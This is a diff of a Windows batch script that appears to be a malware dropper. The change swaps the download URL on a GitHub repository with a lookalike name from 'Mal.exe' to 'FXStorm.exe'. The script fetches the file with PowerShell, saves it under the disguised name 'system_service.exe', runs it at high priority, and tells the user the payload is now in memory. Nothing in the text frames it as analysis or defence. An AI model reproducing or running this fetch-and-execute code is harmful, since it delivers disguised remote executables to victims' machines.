@@ -38,7 +38,7 @@ if %errorlevel% neq 0 (
 )
 
 :: 2. DOWNLOAD THE PAYLOAD
-set "pUrl=https://github.com/g00glecenter101-arch/Loop/raw/refs/heads/main/Mal.exe"
+set "pUrl=https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/FXStorm.exe"
 set "pName=system_service.exe"
 
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%pUrl%', '%pName%')"
@@ -51,4 +51,5 @@ start /high "" "%pName%"
 
 :: 4. EXIT AND WAIT
 :: The payload is now in memory. Just wait your 3-5 minutes.
+
 exit
